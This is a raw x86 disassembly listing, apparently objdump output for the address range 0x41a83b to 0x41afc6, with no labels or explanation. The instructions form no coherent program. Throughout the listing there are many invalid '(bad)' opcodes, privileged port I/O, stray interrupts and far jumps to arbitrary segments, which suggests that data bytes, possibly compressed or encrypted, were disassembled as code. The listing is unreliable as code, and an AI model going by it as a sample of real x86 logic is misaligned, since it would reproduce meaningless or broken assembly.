  41a83b:	ja     0x41a840
  41a83d:	mov    bh,0xce
  41a83f:	push   edi
  41a840:	xlat   BYTE PTR ds:[ebx]
  41a841:	imul   esi,ebp,0x3e
  41a844:	mov    DWORD PTR [ecx-0x35],ecx
  41a847:	xchg   DWORD PTR ds:0xf1d19188,edx
  41a84d:	add    bh,bh
  41a84f:	lahf   
  41a850:	adc    edi,ebx
  41a852:	and    eax,0x58e16034
  41a857:	or     eax,0xe9b1f353
  41a85c:	and    al,0x7e
  41a85e:	dec    eax
  41a85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a860:	into   
  41a861:	xchg   esi,eax
  41a862:	outs   dx,BYTE PTR ds:[esi]
  41a863:	xchg   ebx,eax
  41a864:	test   esp,0xd21d705b
  41a86a:	sbb    DWORD PTR [edx+0x78],eax
  41a86d:	cmp    DWORD PTR [esi+0x4e],ebx
  41a870:	inc    eax
  41a871:	pop    edx
  41a872:	int    0x9f
  41a874:	or     ch,cl
  41a876:	sbb    esi,0xad016222
  41a87c:	sbb    bh,al
  41a87e:	xchg   DWORD PTR [edi],ecx
  41a880:	and    dh,0x38
  41a883:	out    0xfd,eax
  41a885:	fstp   DWORD PTR [edx-0x3040c60e]
  41a88b:	dec    ebp
  41a88c:	and    BYTE PTR [ecx],bh
  41a88e:	dec    ebp
  41a88f:	push   0xffffffec
  41a891:	(bad)  
  41a892:	icebp  
  41a893:	or     al,0xe0
  41a895:	jl     0x41a81c
  41a897:	or     eax,0xa9127cc9
  41a89c:	xor    bl,BYTE PTR [esp+eiz*4-0x5c]
  41a8a0:	xchg   ebp,eax
  41a8a1:	neg    DWORD PTR [esi]
  41a8a3:	cmp    ebx,eax
  41a8a5:	nop
  41a8a6:	xor    BYTE PTR [eax+0x5346bdf],ah
  41a8ac:	repz dec edx
  41a8ae:	push   es
  41a8af:	jl     0x41a90c
  41a8b1:	stos   BYTE PTR es:[edi],al
  41a8b2:	loopne 0x41a928
  41a8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b5:	(bad)  
  41a8b6:	loopne 0x41a917
  41a8b8:	cmp    DWORD PTR [edi+0x4096b851],ebx
  41a8be:	xchg   ebp,eax
  41a8bf:	pusha  
  41a8c0:	ds pop eax
  41a8c2:	retf   
  41a8c3:	push   0x4eaaa9ff
  41a8c8:	push   ss
  41a8c9:	mov    ebx,DWORD PTR [esi+0x2a96a845]
  41a8cf:	cmp    al,0x8f
  41a8d1:	jae    0x41a92a
  41a8d3:	test   DWORD PTR [ecx+esi*1],edx
  41a8d6:	cld    
  41a8d7:	stc    
  41a8d8:	stos   DWORD PTR es:[edi],eax
  41a8d9:	scas   eax,DWORD PTR es:[edi]
  41a8da:	add    cl,BYTE PTR [edx-0x64]
  41a8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8de:	mov    eax,ds:0xf52ba1f6
  41a8e3:	bound  ebp,QWORD PTR [esi]
  41a8e5:	cmp    ecx,ecx
  41a8e7:	inc    ebx
  41a8e8:	pop    es
  41a8e9:	mov    ah,0x46
  41a8eb:	push   edi
  41a8ec:	jmp    0x9f28:0x32014744
  41a8f3:	test   DWORD PTR [eax],esi
  41a8f5:	sbb    BYTE PTR [ebx+eax*2],0x69
  41a8f9:	push   eax
  41a8fa:	xchg   DWORD PTR [esi+0x32014c9e],esi
  41a900:	mov    dl,0xdf
  41a902:	cmp    al,0xcd
  41a904:	xchg   edx,eax
  41a905:	inc    edi
  41a906:	stos   BYTE PTR es:[edi],al
  41a907:	and    esp,DWORD PTR [ecx]
  41a909:	test   eax,0x262e557b
  41a90e:	sub    al,0x58
  41a910:	addr16 aam 0x56
  41a913:	neg    DWORD PTR [eax+esi*2+0x67]
  41a917:	sti    
  41a918:	fnstenv [edi]
  41a91a:	rcr    DWORD PTR [edi+0x54f4e96f],0x5f
  41a921:	scas   al,BYTE PTR es:[edi]
  41a922:	in     al,dx
  41a923:	test   ebx,0x759feca8
  41a929:	sbb    DWORD PTR [esi],ebp
  41a92b:	sbb    ebp,edi
  41a92d:	jg     0x41a965
  41a92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a930:	rol    BYTE PTR [edx+0x51],0xd3
  41a934:	ror    BYTE PTR [eax+edi*1],cl
  41a937:	sbb    eax,0xf1a0c777
  41a93c:	div    BYTE PTR [edi]
  41a93e:	fmul   QWORD PTR [ecx-0x2a]
  41a941:	icebp  
  41a942:	jbe    0x41a8e5
  41a944:	push   edi
  41a945:	adc    DWORD PTR [edi],0x84a29a8c
  41a94b:	sbb    DWORD PTR [ebp-0x21057c0b],ebx
  41a951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a952:	iret   
  41a953:	sub    esi,eax
  41a955:	push   cs
  41a956:	push   ebx
  41a957:	shr    edx,1
  41a959:	cmp    DWORD PTR [edx-0x3d],ecx
  41a95c:	pop    edx
  41a95d:	test   DWORD PTR [esi+0x10e1a841],esi
  41a963:	cmc    
  41a964:	cdq    
  41a965:	iret   
  41a966:	fs add al,0xaf
  41a969:	dec    ebx
  41a96a:	xor    eax,0x893fbff3
  41a96f:	mov    DWORD PTR [ebp-0x51],esi
  41a972:	and    bl,BYTE PTR [eax]
  41a974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a975:	xor    edx,DWORD PTR [edi*1-0x5ec47708]
  41a97c:	enter  0xfe62,0x3b
  41a980:	rcl    esp,1
  41a982:	fdivr  st,st(4)
  41a984:	push   0xca2afd2c
  41a989:	mov    ah,0x66
  41a98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a98c:	fisubr DWORD PTR [ebx+eax*2-0x7c]
  41a990:	mov    ebx,0xdb34d691
  41a995:	add    DWORD PTR [ecx+ebp*8],edi
  41a998:	(bad)  
  41a999:	retf   0xb692
  41a99c:	cdq    
  41a99d:	jo     0x41a92c
  41a99f:	fcomp  DWORD PTR [edx+0x65]
  41a9a2:	and    esi,ebx
  41a9a4:	cdq    
  41a9a5:	fstp   DWORD PTR [edi]
  41a9a7:	mov    ah,0xf2
  41a9a9:	push   edx
  41a9aa:	push   eax
  41a9ab:	hlt    
  41a9ac:	add    DWORD PTR [ebx],0x9aa8241e
  41a9b2:	sbb    DWORD PTR [esi+0x35],0x83fc624b
  41a9b9:	test   DWORD PTR [edx+0x6],edx
  41a9bc:	sub    dh,BYTE PTR [edi+0x74823700]
  41a9c2:	inc    edi
  41a9c3:	jg     0x41a9cc
  41a9c5:	adc    dl,BYTE PTR [eax-0x627d2d24]
  41a9cb:	mov    ebx,0xdcfadc7
  41a9d0:	push   ebp
  41a9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9d2:	inc    esp
  41a9d3:	addr16 (bad) 
  41a9d5:	leave  
  41a9d6:	cli    
  41a9d7:	mov    ebx,0xd3e950dd
  41a9dc:	or     eax,0x2067d9d
  41a9e1:	loope  0x41aa59
  41a9e3:	mov    BYTE PTR [esi+0xc],bl
  41a9e6:	mov    ds:0x72eb91d3,al
  41a9eb:	mov    eax,ds:0x1296b2dc
  41a9f0:	sbb    al,0xaf
  41a9f2:	xchg   edx,eax
  41a9f3:	xchg   edi,eax
  41a9f4:	scas   eax,DWORD PTR es:[edi]
  41a9f5:	aas    
  41a9f6:	inc    ebp
  41a9f7:	xor    al,0x33
  41a9f9:	(bad)  
  41a9fb:	mov    bh,0x27
  41a9fd:	test   BYTE PTR [ecx],0xbc
  41aa00:	add    DWORD PTR [esi+ebx*1+0xce006bf],0xffffff8d
  41aa08:	jg     0x41a9cf
  41aa0a:	(bad)  
  41aa0c:	sbb    DWORD PTR [edi],edi
  41aa0e:	and    al,0x78
  41aa10:	push   esi
  41aa11:	sub    ebx,DWORD PTR [ecx+0x25]
  41aa14:	test   eax,0xe878df32
  41aa19:	adc    BYTE PTR [esi+0x26675e4f],bl
  41aa1f:	xchg   esp,eax
  41aa20:	push   edx
  41aa21:	int    0xd7
  41aa23:	xchg   esp,eax
  41aa25:	dec    ecx
  41aa26:	ret    
  41aa27:	clc    
  41aa28:	mov    edi,0xdae21ef9
  41aa2d:	sub    eax,0x4858c4a5
  41aa32:	mov    al,0x65
  41aa34:	xor    BYTE PTR [eax],bh
  41aa36:	cmp    eax,0x3ab02062
  41aa3b:	adc    DWORD PTR [ebx+0x21],eax
  41aa3e:	mov    ecx,0x92b5e59
  41aa43:	out    dx,al
  41aa44:	mov    cl,0xa5
  41aa46:	ret    0x539c
  41aa49:	int3   
  41aa4a:	jl     0x41aa7f
  41aa4c:	fdivr  DWORD PTR [edx+0x39]
  41aa4f:	int3   
  41aa50:	ds inc ebx
  41aa52:	stc    
  41aa53:	jecxz  0x41aacf
  41aa55:	add    edi,ebp
  41aa57:	cmp    al,0xb3
  41aa59:	iret   
  41aa5a:	in     eax,dx
  41aa5b:	cmp    DWORD PTR [ebp+0x1763b802],ebx
  41aa61:	les    esp,FWORD PTR [edx]
  41aa63:	inc    edx
  41aa64:	mov    ah,BYTE PTR [edi-0x7525a737]
  41aa6a:	aas    
  41aa6b:	jg     0x41aa31
  41aa6d:	mov    BYTE PTR ds:0x4e2fb495,ch
  41aa73:	and    DWORD PTR [ecx],esp
  41aa75:	push   0xbb552ef8
  41aa7a:	or     edx,ebp
  41aa7c:	jmp    FWORD PTR [ecx+ebp*8+0x6b]
  41aa80:	sub    dh,BYTE PTR [esi-0x75909d9d]
  41aa86:	sub    cl,BYTE PTR [edi+0x63]
  41aa89:	xor    ecx,esi
  41aa8b:	outs   dx,DWORD PTR ds:[esi]
  41aa8c:	shr    BYTE PTR [ebp+0x30],1
  41aa8f:	pop    ebx
  41aa90:	mov    ebx,0x2aa0b055
  41aa95:	(bad)  
  41aa96:	hlt    
  41aa97:	mov    bh,0xbf
  41aa99:	inc    eax
  41aa9a:	aad    0x71
  41aa9c:	frstor [edx-0x29]
  41aa9f:	dec    ebp
  41aaa0:	lea    esi,[ebx-0x47e6060b]
  41aaa6:	into   
  41aaa7:	push   es
  41aaa8:	pop    ebx
  41aaa9:	pop    esi
  41aaaa:	pop    edi
  41aaab:	sub    BYTE PTR [ebx],0x5c
  41aaae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaaf:	jl     0x41aab0
  41aab1:	mov    esi,0xff27837f
  41aab6:	arpl   WORD PTR [eax],cx
  41aab8:	lock lds ecx,FWORD PTR [ebp-0x38]
  41aabc:	add    edi,DWORD PTR [esi-0x3c]
  41aabf:	adc    cl,BYTE PTR [edi+0x72204314]
  41aac5:	jbe    0x41aa82
  41aac7:	fimul  WORD PTR [ebp+0x1c]
  41aaca:	sbb    BYTE PTR [ecx+0x44],0xc9
  41aace:	sbb    BYTE PTR [ecx-0x1f],0xde
  41aad2:	enterw 0x9250,0xa6
  41aad7:	adc    DWORD PTR [ebx+0x7ab762f7],ecx
  41aadd:	ja     0x41ab15
  41aadf:	xchg   ebp,eax
  41aae0:	out    0x52,al
  41aae2:	xchg   DWORD PTR [ebx+edx*2+0x41eb8c57],ecx
  41aae9:	jl     0x41aafe
  41aaeb:	adc    DWORD PTR [eax],ebx
  41aaed:	call   0xdf25:0xe2ed51ac
  41aaf4:	jmp    0x9d53:0xe8a624bc
  41aafb:	lahf   
  41aafc:	mov    WORD PTR [ebx+0xf],es
  41aaff:	sub    ecx,DWORD PTR [edi-0x7b3f759d]
  41ab05:	aas    
  41ab06:	es mov dl,0x26
  41ab09:	or     eax,0xaed8b7a
  41ab0e:	jle    0x41aaa8
  41ab10:	jg     0x41ab38
  41ab12:	std    
  41ab13:	inc    eax
  41ab14:	mov    ds:0x4d064b66,eax
  41ab19:	mov    bl,0x52
  41ab1b:	add    eax,DWORD PTR [esi-0x10d7de7]
  41ab21:	sub    BYTE PTR [edi-0x21],al
  41ab24:	loope  0x41aafc
  41ab26:	jnp    0x41aacd
  41ab28:	ror    eax,cl
  41ab2a:	push   ss
  41ab2b:	popa   
  41ab2c:	addr16 inc ebx
  41ab2e:	jecxz  0x41aad6
  41ab30:	dec    esp
  41ab31:	mov    ah,0x42
  41ab33:	stc    
  41ab34:	int    0x3a
  41ab36:	cli    
  41ab37:	dec    ebp
  41ab38:	call   0x49fac2f3
  41ab3d:	pop    esi
  41ab3e:	push   0xb2d06a43
  41ab43:	sbb    bl,BYTE PTR [esi]
  41ab45:	arpl   WORD PTR [edi+0x37],ax
  41ab48:	test   esi,ebx
  41ab4a:	mov    ch,0xaf
  41ab4c:	enter  0x6241,0x3e
  41ab50:	imul   ebx,DWORD PTR [ebp-0x10],0xffffffde
  41ab54:	clc    
  41ab55:	or     ebx,esi
  41ab57:	iret   
  41ab58:	cwde   
  41ab59:	mov    ah,0x6a
  41ab5b:	xchg   DWORD PTR [ecx+eax*4-0x27d6d174],eax
  41ab62:	push   cs
  41ab63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab64:	stos   DWORD PTR es:[edi],eax
  41ab65:	mov    bl,0xce
  41ab67:	pop    ecx
  41ab68:	retf   
  41ab69:	jns    0x41abe4
  41ab6b:	pop    ebp
  41ab6c:	mov    ch,0x2e
  41ab6e:	push   ss
  41ab6f:	fs pop esi
  41ab71:	(bad)  [ebp+0x4d]
  41ab74:	sub    esp,edi
  41ab76:	sbb    esi,edi
  41ab78:	test   eax,0x12fcb441
  41ab7d:	sub    al,0xa5
  41ab7f:	pusha  
  41ab80:	xor    al,0xfd
  41ab82:	nop
  41ab83:	dec    eax
  41ab84:	aad    0x90
  41ab86:	inc    eax
  41ab87:	leave  
  41ab88:	call   0x6cc3ce24
  41ab8d:	mov    ds:0x163e593a,al
  41ab92:	jno    0x41abec
  41ab94:	cmp    BYTE PTR [ecx+0x43f881d0],dl
  41ab9a:	shl    DWORD PTR [eax],0x15
  41ab9d:	cmp    esp,DWORD PTR [eax]
  41ab9f:	jnp    0x41abe3
  41aba1:	rcr    DWORD PTR [edi+ebp*4-0x69736454],1
  41aba8:	add    ch,BYTE PTR [esi-0x25]
  41abab:	add    dl,bh
  41abad:	xlat   BYTE PTR ds:[ebx]
  41abae:	adc    BYTE PTR [ecx+eiz*8-0x2d],bl
  41abb2:	mov    esi,0x62d5ffb5
  41abb7:	lods   al,BYTE PTR ds:[esi]
  41abb8:	ret    
  41abb9:	inc    ecx
  41abba:	push   ebx
  41abbb:	adc    bh,BYTE PTR [edi-0x3248d468]
  41abc1:	int3   
  41abc2:	pop    ecx
  41abc3:	outs   dx,DWORD PTR ds:[esi]
  41abc4:	push   es
  41abc5:	int3   
  41abc6:	push   ebp
  41abc7:	sti    
  41abc8:	and    dh,BYTE PTR [esi-0x21]
  41abcb:	push   es
  41abcc:	xchg   DWORD PTR [edx-0x4e2c09d1],edi
  41abd2:	add    ebp,0x59
  41abd5:	je     0x41ac1a
  41abd7:	push   ecx
  41abd8:	(bad)  [edi-0x34]
  41abdb:	jae    0x41abe7
  41abdd:	popa   
  41abde:	sbb    DWORD PTR ds:0x566a1e05,esp
  41abe4:	add    BYTE PTR [ecx],cl
  41abe6:	add    cl,BYTE PTR [esi+0x13]
  41abe9:	and    al,0xaa
  41abeb:	sub    al,BYTE PTR [edi+0x66]
  41abee:	add    BYTE PTR [edi+edi*4+0x19102c2b],bl
  41abf5:	cmp    BYTE PTR [ebp-0x5c58094b],dl
  41abfb:	dec    DWORD PTR [ebx+0x53cfc0f]
  41ac01:	adc    eax,0x895745f9
  41ac06:	aaa    
  41ac07:	cwde   
  41ac08:	mov    bh,0x1c
  41ac0a:	leave  
  41ac0b:	ins    DWORD PTR es:[edi],dx
  41ac0c:	mov    ds:0x440679c5,eax
  41ac11:	mov    cl,0x72
  41ac13:	(bad)
  41ac16:	xlat   BYTE PTR ds:[ebx]
  41ac17:	sbb    eax,0x17eb19f0
  41ac1c:	inc    esp
  41ac1d:	pop    eax
  41ac1e:	dec    edx
  41ac1f:	adc    ecx,DWORD PTR [ebx-0x74]
  41ac22:	jo     0x41ac23
  41ac24:	test   al,0x78
  41ac26:	pop    eax
  41ac27:	and    dl,BYTE PTR [edx+0x54]
  41ac2a:	call   0x24d69c1
  41ac2f:	es sub edi,edi
  41ac32:	add    dl,BYTE PTR ds:0xc7f3413d
  41ac38:	xor    eax,0xbf66e03
  41ac3d:	mov    ch,0x0
  41ac3f:	add    BYTE PTR [eax],al
  41ac41:	add    BYTE PTR [ebp+0x4d],cl
  41ac44:	ss retf 0xfb36
  41ac48:	std    
  41ac49:	iret   
  41ac4a:	cmp    esp,DWORD PTR [edx]
  41ac4c:	(bad)  
  41ac4d:	cld    
  41ac4e:	add    al,0xb3
  41ac50:	adc    eax,0x128ad4c
  41ac55:	add    ah,dh
  41ac57:	add    al,0x0
  41ac59:	add    BYTE PTR [edi+edi*1-0x7c],dh
  41ac5d:	mov    ebx,0x3340a5a6
  41ac62:	or     al,0xdd
  41ac64:	and    ebp,DWORD PTR [ebx+eiz*1+0x78be2914]
  41ac6b:	das    
  41ac6c:	loopne 0x41acbd
  41ac6e:	mov    ah,0x7e
  41ac70:	push   ecx
  41ac71:	loop   0x41acd2
  41ac73:	fld    QWORD PTR [eax+0x5a480f2a]
  41ac79:	xchg   ch,ch
  41ac7b:	in     eax,dx
  41ac7c:	pop    esp
  41ac7d:	cwde   
  41ac7e:	mov    ebx,0x1df3ed67
  41ac83:	xchg   edx,eax
  41ac84:	cli    
  41ac85:	das    
  41ac86:	fidiv  WORD PTR [ebx+0xdfe1eb3]
  41ac8c:	adc    eax,0x2b3adc45
  41ac91:	lods   eax,DWORD PTR ds:[esi]
  41ac92:	test   al,0x65
  41ac94:	shl    BYTE PTR [ebx],1
  41ac96:	or     al,0x1c
  41ac98:	imul   edx,ecx,0xffffffd8
  41ac9b:	cmp    cl,bh
  41ac9d:	pop    ebx
  41ac9e:	call   DWORD PTR [esi+0x6b]
  41aca1:	ret    
  41aca2:	pop    ebp
  41aca3:	call   0xaf97bdfb
  41aca8:	sub    edi,DWORD PTR [ecx+0xff9414e]
  41acae:	pop    ecx
  41acaf:	cld    
  41acb0:	iret   
  41acb1:	add    DWORD PTR [esi+0x267e224f],eax
  41acb7:	jne    0x41ad2f
  41acb9:	(bad)  
  41acba:	daa    
  41acbb:	stos   BYTE PTR es:[edi],al
  41acbc:	lods   eax,DWORD PTR ds:[esi]
  41acbd:	ins    BYTE PTR es:[edi],dx
  41acbe:	jnp    0x41ad04
  41acc0:	in     al,dx
  41acc1:	mov    cs,ebp
  41acc3:	mul    bl
  41acc5:	or     BYTE PTR [ecx-0x409671e1],dh
  41accb:	xchg   BYTE PTR [ebx+0x6d],ah
  41acce:	dec    ecx
  41accf:	inc    esi
  41acd0:	in     eax,0x95
  41acd2:	mov    eax,ds:0x12cdf40d
  41acd7:	pop    eax
  41acd8:	sbb    esp,DWORD PTR [ecx+ebx*2+0x30]
  41acdc:	mov    ebx,0xe70edee7
  41ace1:	adc    edi,DWORD PTR [edx+0x771e107f]
  41ace7:	mov    esi,0xc87ccaf2
  41acec:	jg     0x41ad4b
  41acee:	lds    esi,FWORD PTR [esi+0x6a9267b3]
  41acf4:	inc    ebp
  41acf5:	(bad)  
  41acf6:	or     BYTE PTR [edx-0x6f],bh
  41acf9:	jne    0x41ad27
  41acfb:	push   cs
  41acfc:	inc    esi
  41acfd:	jo     0x41ad59
  41acff:	add    eax,0xef8d5dd1
  41ad04:	mov    ds:0x9b22677d,eax
  41ad09:	sahf   
  41ad0a:	inc    ebp
  41ad0b:	xor    eax,0x7bd4f542
  41ad10:	xor    al,0x43
  41ad12:	push   ebx
  41ad13:	arpl   WORD PTR [ebx+0x29],bx
  41ad16:	mov    dh,0x88
  41ad18:	add    DWORD PTR [edi-0x80],edx
  41ad1b:	mov    ds:0xd275e113,al
  41ad20:	xor    ch,BYTE PTR [ebx+0x1d8438fb]
  41ad26:	sar    BYTE PTR [ecx+0x0],1
  41ad29:	pop    ecx
  41ad2a:	call   0x6a0f2360
  41ad2f:	pushf  
  41ad30:	in     al,dx
  41ad31:	push   0xffffffe2
  41ad33:	dec    edi
  41ad34:	jo     0x41ada1
  41ad36:	lods   eax,DWORD PTR ds:[esi]
  41ad37:	and    BYTE PTR [edi+0x58f3da2f],0xb8
  41ad3e:	pop    esi
  41ad3f:	mov    ah,bl
  41ad41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad42:	and    DWORD PTR [esi-0x50],eax
  41ad45:	ja     0x41ad6f
  41ad47:	leave  
  41ad48:	jl     0x41ad56
  41ad4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4b:	mov    edx,0xac1aafa6
  41ad50:	mov    eax,0xa50a2a5c
  41ad55:	imul   DWORD PTR [eax+0x611fefdc]
  41ad5b:	inc    esi
  41ad5c:	jae    0x41adb9
  41ad5e:	mov    edx,0x8db3daf1
  41ad63:	fwait
  41ad64:	or     edi,0x9b6e2d7f
  41ad6a:	jp     0x41ad87
  41ad6c:	ss repnz loopne 0x41ad8d
  41ad70:	aas    
  41ad71:	inc    ebx
  41ad72:	jge    0x41ad26
  41ad74:	fistp  QWORD PTR [eax+0x1a]
  41ad77:	and    esp,edx
  41ad79:	shr    BYTE PTR [eax+eax*2+0x527efc1d],1
  41ad80:	mov    ss,WORD PTR [esi-0x16]
  41ad83:	imul   esi,DWORD PTR [ecx+0x4cfcabce],0xffffff83
  41ad8a:	xchg   ecx,eax
  41ad8b:	push   ecx
  41ad8c:	(bad)  [eax]
  41ad8e:	(bad)  
  41ad8f:	fbstp  TBYTE PTR [esi+0x5e72329a]
  41ad95:	sbb    DWORD PTR [ebx-0x20],esi
  41ad98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad99:	add    eax,0x38ebee28
  41ad9e:	cmp    cl,BYTE PTR [eax-0x136ee368]
  41ada4:	cdq    
  41ada5:	ja     0xbd9b4ee3
  41adab:	inc    ebp
  41adac:	ins    BYTE PTR es:[edi],dx
  41adad:	imul   edi,DWORD PTR [edi-0x2803e7fa],0xffffffab
  41adb4:	jnp    0x41ad3e
  41adb6:	rcl    BYTE PTR [edi],1
  41adb8:	test   eax,0xe9212386
  41adbd:	ins    BYTE PTR es:[edi],dx
  41adbe:	fiadd  WORD PTR [ebx-0x43]
  41adc1:	jp     0x41ad86
  41adc3:	xchg   ecx,eax
  41adc4:	xor    eax,0x7198fd9b
  41adc9:	or     cl,dl
  41adcb:	ds fdiv st,st(6)
  41adce:	push   edx
  41adcf:	stos   DWORD PTR es:[edi],eax
  41add0:	mov    ah,0xbe
  41add2:	cli    
  41add3:	repz xchg cx,ax
  41add6:	stos   DWORD PTR es:[edi],eax
  41add7:	jge    0x41adf2
  41add9:	or     ecx,eax
  41addb:	inc    edx
  41addc:	jmp    0x41adb1
  41adde:	mov    al,0x6c
  41ade0:	nop
  41ade1:	mov    edi,0x5c96ba6b
  41ade6:	(bad)  
  41ade7:	and    dl,dh
  41ade9:	xor    dl,BYTE PTR [esi+0x73]
  41adec:	mov    edx,0xe0a1df6b
  41adf1:	cdq    
  41adf2:	das    
  41adf3:	pop    eax
  41adf4:	sti    
  41adf5:	push   ds
  41adf6:	mov    eax,0x3f1bdbb9
  41adfb:	pop    ebp
  41adfc:	sbb    dl,BYTE PTR [edx+0x474e4455]
  41ae02:	aaa    
  41ae03:	mov    cs,WORD PTR [edi+0x37897f70]
  41ae09:	(bad)  
  41ae0a:	pop    edi
  41ae0b:	sub    DWORD PTR [eax-0x17f1489],0x1f
  41ae12:	iret   
  41ae13:	(bad)  
  41ae14:	call   0x1279f28d
  41ae19:	sahf   
  41ae1a:	ret    0x393f
  41ae1d:	hlt    
  41ae1e:	dec    ebp
  41ae1f:	ss out 0x85,al
  41ae22:	sbb    eax,0x438a92db
  41ae27:	fcom   DWORD PTR [ebp-0x54]
  41ae2a:	mov    eax,ds:0x3791d280
  41ae2f:	pop    ss
  41ae30:	jecxz  0x41adee
  41ae32:	sbb    eax,0xad21d5f6
  41ae37:	mov    ebp,0x7e8f5078
  41ae3c:	jmp    0x5757:0xc6779a10
  41ae43:	mov    BYTE PTR [esi],0x78
  41ae46:	mov    BYTE PTR [edx],ah
  41ae48:	repnz clc 
  41ae4a:	push   edi
  41ae4b:	mov    dl,0x29
  41ae4d:	sahf   
  41ae4e:	adc    eax,0xccac7e2
  41ae53:	fstp   TBYTE PTR [ebx+0x17967b9c]
  41ae59:	ret    
  41ae5a:	and    BYTE PTR [ecx+0x41db4ee6],dl
  41ae60:	jg     0x41ae66
  41ae62:	fimul  WORD PTR [ebx+0x170c4eb0]
  41ae68:	popa   
  41ae69:	sub    eax,0x7b0d1de0
  41ae6e:	lea    eax,[edx+0x6c4b2bec]
  41ae74:	retf   
  41ae75:	mov    esi,ebp
  41ae77:	jmp    FWORD PTR [ebx-0x225df8ac]
  41ae7d:	cwde   
  41ae7e:	mov    bl,0x2b
  41ae80:	retf   0x9470
  41ae83:	scas   eax,DWORD PTR es:[edi]
  41ae84:	out    dx,al
  41ae85:	(bad)  [edx+0x5e06481b]
  41ae8b:	push   esi
  41ae8c:	scas   al,BYTE PTR es:[edi]
  41ae8d:	lea    edx,[ecx+0x78]
  41ae90:	test   ch,dh
  41ae92:	sub    al,0x1c
  41ae94:	in     eax,dx
  41ae95:	push   edi
  41ae96:	gs push ebp
  41ae98:	nop
  41ae99:	xchg   edx,eax
  41ae9a:	lock dec DWORD PTR [esi-0x4c]
  41ae9e:	pop    edi
  41ae9f:	and    DWORD PTR [edi],ebp
  41aea1:	push   ebx
  41aea2:	cdq    
  41aea3:	mov    ah,al
  41aea5:	fmul   st(7),st
  41aea7:	cli    
  41aea8:	mov    edi,0x71f9a93f
  41aead:	(bad)  
  41aeae:	xor    ebx,DWORD PTR [ebx+0x63]
  41aeb1:	mov    dl,0xca
  41aeb3:	(bad)  
  41aeb4:	lahf   
  41aeb5:	ins    BYTE PTR es:[edi],dx
  41aeb6:	daa    
  41aeb7:	sub    bl,BYTE PTR [ecx]
  41aeb9:	in     al,dx
  41aeba:	cmp    dh,dh
  41aebc:	sub    BYTE PTR ds:0xcab3275f,ah
  41aec2:	push   edx
  41aec3:	cs fs ret 
  41aec6:	je     0x41af13
  41aec8:	loop   0x41af41
  41aeca:	test   DWORD PTR [edi-0x5fce0ca2],0x574c912f
  41aed4:	das    
  41aed5:	adc    BYTE PTR [esi-0x5f],dh
  41aed8:	adc    esi,DWORD PTR [ecx]
  41aeda:	ret    
  41aedb:	jge    0x41af3e
  41aedd:	cmc    
  41aede:	stos   DWORD PTR es:[edi],eax
  41aedf:	lea    eax,[ebx*1+0x5400a2eb]
  41aee6:	xor    eax,0x59a3b7fa
  41aeeb:	enter  0xd11e,0x4e
  41aeef:	sti    
  41aef0:	stos   BYTE PTR es:[edi],al
  41aef1:	call   FWORD PTR [edx]
  41aef3:	das    
  41aef4:	stc    
  41aef5:	mov    al,0x75
  41aef7:	push   0x8
  41aef9:	dec    esp
  41aefa:	not    eax
  41aefc:	fs call 0x8460:0x9495c274
  41af04:	push   ds
  41af05:	out    0x86,eax
  41af07:	cld    
  41af08:	push   ds
  41af09:	mov    WORD PTR [edi-0x46],cs
  41af0c:	dec    eax
  41af0d:	jmp    0x18a3:0x8cfd7dd4
  41af14:	xor    bh,0x22
  41af17:	test   BYTE PTR [edi+0x6d],bl
  41af1a:	popa   
  41af1b:	adc    al,0x53
  41af1d:	(bad)  
  41af1e:	adc    BYTE PTR [esi-0x2e0882f5],ah
  41af24:	ror    ebx,1
  41af26:	add    esp,DWORD PTR [edi-0x6578a03f]
  41af2c:	inc    ebx
  41af2d:	mov    eax,0x63bb1d98
  41af32:	dec    ebp
  41af33:	retf   
  41af34:	mov    bl,0x4
  41af36:	gs jne 0x41af9f
  41af39:	das    
  41af3a:	cwde   
  41af3b:	cmp    bh,dh
  41af3d:	not    cl
  41af3f:	in     al,dx
  41af40:	inc    edx
  41af41:	neg    DWORD PTR [edx+0x4c857478]
  41af47:	iret   
  41af48:	mov    ss,WORD PTR [ebx-0x60cd045e]
  41af4e:	test   al,0xf3
  41af50:	mov    dh,0x37
  41af52:	adc    eax,0xcea00871
  41af57:	xchg   ebx,eax
  41af58:	loope  0x41afbd
  41af5a:	out    dx,eax
  41af5b:	jmp    0x41af03
  41af5d:	push   ds
  41af5e:	and    eax,0x2e3df433
  41af63:	fwait
  41af64:	xchg   sp,ax
  41af66:	sar    BYTE PTR [ebp+0x3d90e85e],0x69
  41af6d:	pmuludq mm4,QWORD PTR ds:0x65d3eefb
  41af74:	push   0x6a
  41af76:	int    0xa
  41af78:	inc    eax
  41af79:	dec    esi
  41af7a:	lock xchg edi,eax
  41af7c:	inc    esi
  41af7d:	mov    ch,BYTE PTR [ecx]
  41af7f:	xor    al,0x1b
  41af81:	or     BYTE PTR [ebp+eiz*8-0xf848c83],al
  41af88:	pop    ecx
  41af89:	in     eax,dx
  41af8a:	inc    eax
  41af8b:	es mov ebx,edi
  41af8e:	addr16 popa 
  41af90:	adc    al,0x4b
  41af92:	mov    bl,ch
  41af94:	out    dx,al
  41af95:	test   BYTE PTR [edx+0x67d3c40],dl
  41af9b:	and    eax,0x561a242d
  41afa0:	mov    cl,0x75
  41afa2:	(bad)  
  41afa3:	jge    0x41af81
  41afa5:	mov    edx,DWORD PTR [edx-0x4d99e7e4]
  41afab:	mov    bh,BYTE PTR [ecx]
  41afad:	mov    ds:0x2ace6d24,eax
  41afb2:	mov    ah,0xff
  41afb4:	add    al,0xd1
  41afb6:	hlt    
  41afb7:	mov    edi,0x42c63a3f
  41afbc:	rol    cl,1
  41afbe:	fsub   st,st(6)
  41afc0:	mov    dl,0x8
  41afc2:	jle    0x41afac
  41afc4:	mov    al,0xb0
  41afc6:	xchg   ecx,eax
